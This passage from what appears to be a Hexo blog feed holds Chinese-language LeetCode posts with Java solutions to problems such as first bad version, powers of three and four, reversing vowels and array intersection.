<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isPowerOfTwo</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (n &lt; <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        String s = Integer.toBinaryString(n);</span><br><span class="line">        <span class="keyword">long</span> count = s.chars().filter(c -&gt; <span class="string">'1'</span> == c).count();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span> == count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>278. 第一个错误的版本</title>
    <url>/2018/08/30/LeetCode/leetcode-000278.%20%E7%AC%AC%E4%B8%80%E4%B8%AA%E9%94%99%E8%AF%AF%E7%9A%84%E7%89%88%E6%9C%AC/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>你是产品经理，目前正在带领一个团队开发新的产品。不幸的是，你的产品的最新版本没有通过质量检测。由于每个版本都是基于之前的版本开发的，所以错误的版本之后的所有版本都是错的。</p>
<p>假设你有 <code>n</code> 个版本 <code>[1, 2, ..., n]</code>，你想找出导致之后所有版本出错的第一个错误的版本。</p>
<p>你可以通过调用 <code>bool isBadVersion(version)</code> 接口来判断版本号 <code>version</code> 是否在单元测试中出错。实现一个函数来查找第一个错误的版本。你应该尽量减少对调用 API 的次数。<br><strong>示例：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">给定 n &#x3D; 5，并且 version &#x3D; 4 是第一个错误的版本。</span><br><span class="line"></span><br><span class="line">调用 isBadVersion(3) -&gt; false</span><br><span class="line">调用 isBadVersion(5) -&gt; true</span><br><span class="line">调用 isBadVersion(4) -&gt; true</span><br><span class="line"></span><br><span class="line">所以，4 是第一个错误的版本。</span><br></pre></td></tr></table></figure>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>二分查找，减少调用API次数。<br>###</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* The isBadVersion API is defined in the parent class VersionControl.</span></span><br><span class="line"><span class="comment">      boolean isBadVersion(int version); */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> <span class="keyword">extends</span> <span class="title">VersionControl</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">firstBadVersion</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> begin = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> end = n;</span><br><span class="line">        <span class="keyword">int</span> mid = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(begin &lt;= end) &#123;</span><br><span class="line">            mid = begin + (end - begin) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> (isBadVersion(mid)) &#123;</span><br><span class="line">                end = mid - <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                begin = mid + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> begin;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>326. 3的幂</title>
    <url>/2018/08/30/LeetCode/leetcode-000326.%203%E7%9A%84%E5%B9%82/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个整数，写一个函数来判断它是否是 3 的幂次方。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 27</span><br><span class="line">输出: true</span><br></pre></td></tr></table></figure>
<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 0</span><br><span class="line">输出: false</span><br></pre></td></tr></table></figure>
<h2 id="示例3："><a href="#示例3：" class="headerlink" title="示例3："></a>示例3：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 9</span><br><span class="line">输出: true</span><br></pre></td></tr></table></figure>
<h2 id="示例4："><a href="#示例4：" class="headerlink" title="示例4："></a>示例4：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 45</span><br><span class="line">输出: false</span><br></pre></td></tr></table></figure>
<h2 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h2><p>你能不使用循环或者递归来完成本题吗？</p>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一：递归"><a href="#解法一：递归" class="headerlink" title="解法一：递归"></a>解法一：递归</h3><h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isPowerOfThree</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">0</span>) &#123;</span><br><span class="line">        	<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (n == <span class="number">1</span>) &#123;</span><br><span class="line">        	<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (n % <span class="number">3</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        	<span class="keyword">return</span> isPowerOfThree(n / <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二：循环"><a href="#解法二：循环" class="headerlink" title="解法二：循环"></a>解法二：循环</h3><h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isPowerOfThree</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (n &lt; <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (n % <span class="number">3</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            n /= <span class="number">3</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> n == <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法三：数学方法"><a href="#解法三：数学方法" class="headerlink" title="解法三：数学方法"></a>解法三：数学方法</h3><p><img src="https://huhansi.github.io/images/2020-3demi.png" alt="数学公式"></p>
<h4 id="Java-2"><a href="#Java-2" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isPowerOfThree</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (Math.log10(n) / Math.log10(<span class="number">3</span>)) % <span class="number">1</span> == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法四："><a href="#解法四：" class="headerlink" title="解法四："></a>解法四：</h3><p>使用库函数，转换成3进制的数的字符串，然后判断字符串是否只包含一个1.</p>
<h4 id="Java-3"><a href="#Java-3" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isPowerOfThree</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Integer.toString(n, <span class="number">3</span>).matches(<span class="string">"^10*$"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法五：整数限制"><a href="#解法五：整数限制" class="headerlink" title="解法五：整数限制"></a>解法五：整数限制</h3><p>我们现在可以推断出 <code>n</code> 的最大值，也就是 3 的幂，是 <strong>1162261467</strong>。因此，我们应该返回 true 的 n 的可能值是 3，9…3 的19次方。因为 3 是质数，所以 3的19次方 的除数只有 3，9，27，3的19次方，因此我们只需要将 3的19次方 除以 n。若余数为 0 意味着 n 是 3的19次方 的除数，因此是 3 的幂。</p>
<h4 id="Java-4"><a href="#Java-4" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isPowerOfThree</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> n &gt; <span class="number">0</span> &amp;&amp; <span class="number">1162261467</span> % n == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>342. 4的幂</title>
    <url>/2018/08/30/LeetCode/leetcode-000342.%204%E7%9A%84%E5%B9%82/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个整数 (32 位有符号整数)，请编写一个函数来判断它是否是 4 的幂次方。<br><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 16</span><br><span class="line">输出: true</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 5</span><br><span class="line">输出: false</span><br></pre></td></tr></table></figure>
<p><strong>进阶：</strong>你能不使用循环或者递归来完成本题吗？</p>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>使用对数</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isPowerOfFour</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (num &lt; <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">double</span> logAns = Math.log10(num) / Math.log10(<span class="number">4</span>);</span><br><span class="line">	    <span class="keyword">return</span> (logAns - (<span class="keyword">int</span>)logAns == <span class="number">0</span>) ? <span class="keyword">true</span> : <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>345. 反转字符串中的元音字母</title>
    <url>/2018/08/30/LeetCode/leetcode-000345.%20%E5%8F%8D%E8%BD%AC%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%AD%E7%9A%84%E5%85%83%E9%9F%B3%E5%AD%97%E6%AF%8D/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>编写一个函数，以字符串作为输入，反转该字符串中的元音字母。<br><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;hello&quot;</span><br><span class="line">输出: &quot;holle&quot;</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;leetcode&quot;</span><br><span class="line">输出: &quot;leotcede&quot;</span><br></pre></td></tr></table></figure>
<p><strong>说明:</strong><br>元音字母不包含字母”y”。</p>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>忘记了</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">reverseVowels</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        Set&lt;Character&gt; cSet = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">        cSet.add(<span class="string">'A'</span>);</span><br><span class="line">        cSet.add(<span class="string">'E'</span>);</span><br><span class="line">        cSet.add(<span class="string">'I'</span>);</span><br><span class="line">        cSet.add(<span class="string">'O'</span>);</span><br><span class="line">        cSet.add(<span class="string">'U'</span>);</span><br><span class="line">        cSet.add(<span class="string">'a'</span>);</span><br><span class="line">        cSet.add(<span class="string">'e'</span>);</span><br><span class="line">        cSet.add(<span class="string">'i'</span>);</span><br><span class="line">        cSet.add(<span class="string">'o'</span>);</span><br><span class="line">        cSet.add(<span class="string">'u'</span>);</span><br><span class="line">        </span><br><span class="line">        List&lt;Character&gt; values = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; s.length();i++) &#123;</span><br><span class="line">        	<span class="keyword">char</span> c = s.charAt(i);</span><br><span class="line">        	<span class="keyword">if</span> (cSet.contains(c)) &#123;</span><br><span class="line">        		values.add(c);</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">int</span> index = values.size() - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; s.length();i++) &#123;</span><br><span class="line">        	<span class="keyword">char</span> c = s.charAt(i);</span><br><span class="line">        	<span class="keyword">if</span> (cSet.contains(c)) &#123;</span><br><span class="line">        		sb.append(values.get(index--));</span><br><span class="line">        	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        		sb.append(c);</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>350. 两个数组的交集 II</title>
    <url>/2018/08/30/LeetCode/leetcode-000350.%20%E4%B8%A4%E4%B8%AA%E6%95%B0%E7%BB%84%E7%9A%84%E4%BA%A4%E9%9B%86%20II/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定两个数组，编写一个函数来计算它们的交集。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: nums1 &#x3D; [1,2,2,1], nums2 &#x3D; [2,2]</span><br><span class="line">输出: [2,2]</span><br></pre></td></tr></table></figure>
<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: nums1 &#x3D; [4,9,5], nums2 &#x3D; [9,4,9,8,4]</span><br><span class="line">输出: [4,9]</span><br></pre></td></tr></table></figure>
<h2 id="说明："><a href="#说明：" class="headerlink" title="说明："></a>说明：</h2><ul>
<li>输出结果中每个元素出现的次数，应与元素在两个数组中出现的次数一致。</li>
<li>我们可以不考虑输出结果的顺序。</li>
</ul>
<h2 id="进阶："><a href="#进阶：" class="headerlink" title="进阶："></a>进阶：</h2><ul>
<li>如果给定的数组已经排好序呢？你将如何优化你的算法？</li>
<li>如果 nums1 的大小比 nums2 小很多，哪种方法更优？</li>
<li>如果 nums2 的元素存储在磁盘上，磁盘内存是有限的，并且你不能一次加载所有的元素到内存中，你该怎么办？</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>和349不同，这边不需要使用HashSet，替换成ArrayList即可。</p>
<p>使用ArrayList把两个数组相同的元素全部保存起来，返回即可。</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] intersect(<span class="keyword">int</span>[] nums1, <span class="keyword">int</span>[] nums2) &#123;</span><br><span class="line">		Arrays.sort(nums1);</span><br><span class="line">		Arrays.sort(nums2);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">int</span> length1 = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">int</span> length2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">		ArrayList&lt;Integer&gt; result = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">while</span> (length1 &lt; nums1.length &amp;&amp; length2 &lt; nums2.length) &#123;</span><br><span class="line">			<span class="keyword">if</span> (nums1[length1] == nums2[length2]) &#123;</span><br><span class="line">				result.add(nums1[length1]);</span><br><span class="line">				length1++;</span><br><span class="line">				length2++;</span><br><span class="line">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums1[length1] &lt; nums2[length2]) &#123;</span><br><span class="line">				length1++;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				length2++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">int</span> array[] = <span class="keyword">new</span> <span class="keyword">int</span>[result.size()];</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; result.size();i++) &#123;</span><br><span class="line">			array[i] = result.get(i);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> array;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>367. 有效的完全平方数</title>
    <url>/2018/08/30/LeetCode/leetcode-000367.%20%E6%9C%89%E6%95%88%E7%9A%84%E5%AE%8C%E5%85%A8%E5%B9%B3%E6%96%B9%E6%95%B0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个正整数 num，编写一个函数，如果 num 是一个完全平方数，则返回 True，否则返回 False。</p>
<p>说明：不要使用任何内置的库函数，如  <code>sqrt</code>。<br><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入： 16</span><br><span class="line"></span><br><span class="line">输出： True</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入： 14</span><br><span class="line"></span><br><span class="line">输出： False</span><br></pre></td></tr></table></figure>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>牛顿迭代法</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isPerfectSquare</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">long</span> r = num;</span><br><span class="line">        <span class="keyword">while</span> (r * r &gt; num) &#123;</span><br><span class="line">            r = (r + num / r) / <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> num ==  r * r;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>374. 猜数字大小</title>
    <url>/2018/08/30/LeetCode/leetcode-000374.%20%E7%8C%9C%E6%95%B0%E5%AD%97%E5%A4%A7%E5%B0%8F/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>我们正在玩一个猜数字游戏。 游戏规则如下：<br>我从 <code>1</code> 到 <code>n</code> 选择一个数字。 你需要猜我选择了哪个数字。<br>每次你猜错了，我会告诉你这个数字是大了还是小了。<br>你调用一个预先定义好的接口 <code>guess(int num)</code>，它会返回 3 个可能的结果（<code>-1</code>，<code>1</code> 或 <code>0</code>）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1 : 我的数字比较小</span><br><span class="line"> 1 : 我的数字比较大</span><br><span class="line"> 0 : 恭喜！你猜对了！</span><br></pre></td></tr></table></figure>
<p><strong>*示例：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">n &#x3D; 10, 我选择 6.</span><br><span class="line"></span><br><span class="line">返回 6.</span><br></pre></td></tr></table></figure>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>二分查找</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* The guess API is defined in the parent class GuessGame.</span></span><br><span class="line"><span class="comment">   @param num, your guess</span></span><br><span class="line"><span class="comment">   @return -1 if my number is lower, 1 if my number is higher, otherwise return 0</span></span><br><span class="line"><span class="comment">      int guess(int num); */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> <span class="keyword">extends</span> <span class="title">GuessGame</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">guessNumber</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> mid = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> begin = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> end = n;</span><br><span class="line">        <span class="keyword">while</span> (begin &lt;= end) &#123;</span><br><span class="line">        	mid = begin + (end - begin) / <span class="number">2</span>;</span><br><span class="line">        	<span class="keyword">if</span> (<span class="number">1</span> == guess(mid)) &#123;</span><br><span class="line">        		begin = mid + <span class="number">1</span>;</span><br><span class="line">        	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (-<span class="number">1</span> == guess(mid)) &#123;</span><br><span class="line">        		end = mid - <span class="number">1</span>;</span><br><span class="line">        	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        		<span class="keyword">return</span> mid;</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>453. 最小移动次数使数组元素相等</title>
    <url>/2018/08/30/LeetCode/leetcode-000453.%20%E6%9C%80%E5%B0%8F%E7%A7%BB%E5%8A%A8%E6%AC%A1%E6%95%B0%E4%BD%BF%E6%95%B0%E7%BB%84%E5%85%83%E7%B4%A0%E7%9B%B8%E7%AD%89/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个长度为 n 的<code>非</code>空整数数组，找到让数组所有元素相等的最小移动次数。每次移动可以使 n - 1 个元素增加 1。<br><strong>示例：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入:</span><br><span class="line">[1,2,3]</span><br><span class="line"></span><br><span class="line">输出:</span><br><span class="line">3</span><br><span class="line"></span><br><span class="line">解释:</span><br><span class="line">只需要3次移动（注意每次移动会增加两个元素的值）：</span><br><span class="line"></span><br><span class="line">[1,2,3]  &#x3D;&gt;  [2,3,3]  &#x3D;&gt;  [3,4,3]  &#x3D;&gt;  [4,4,4]</span><br></pre></td></tr></table></figure>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>这个问题就是数组中最小的值，几次之后才能变成和最大的一样。</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minMoves</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> min = Integer.MAX_VALUE;</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nums.length;i++) &#123;</span><br><span class="line">        	sum += nums[i];</span><br><span class="line">        	<span class="keyword">if</span> (min &gt; nums[i]) &#123;</span><br><span class="line">        		min = nums[i];</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum - nums.length * min;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>581. 最短无序连续子数组</title>
    <url>/2018/08/30/LeetCode/leetcode-000581.%20%E6%9C%80%E7%9F%AD%E6%97%A0%E5%BA%8F%E8%BF%9E%E7%BB%AD%E5%AD%90%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个整数数组，你需要寻找一个<code>连续的子数组</code>，如果对这个子数组进行升序排序，那么整个数组都会变为升序排序。</p>
<p>你找到的子数组应是<code>最短</code>的，请输出它的长度。<br><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [2, 6, 4, 8, 10, 9, 15]</span><br><span class="line">输出: 5</span><br><span class="line">解释: 你只需要对 [6, 4, 8, 10, 9] 进行升序排序，那么整个表都会变为升序排序。</span><br></pre></td></tr></table></figure>
<p><strong>说明：</strong></p>
<ol>
<li>输入的数组长度范围在 [1, 10,000]。</li>
<li>输入的数组可能包含重复元素 ，所以升序的意思是&lt;=。</li>
</ol>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>将原数组拷贝一份，排序。然后从头和从尾部分别遍历，找到不同的子序列即可。</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findUnsortedSubarray</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] numOfCopy = Arrays.copyOf(nums, nums.length);</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        <span class="keyword">int</span> begin = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nums.length;i++) &#123;</span><br><span class="line">        	<span class="keyword">if</span> (nums[i] != numOfCopy[i]) &#123;</span><br><span class="line">        		begin = i;</span><br><span class="line">        		<span class="keyword">break</span>;</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span 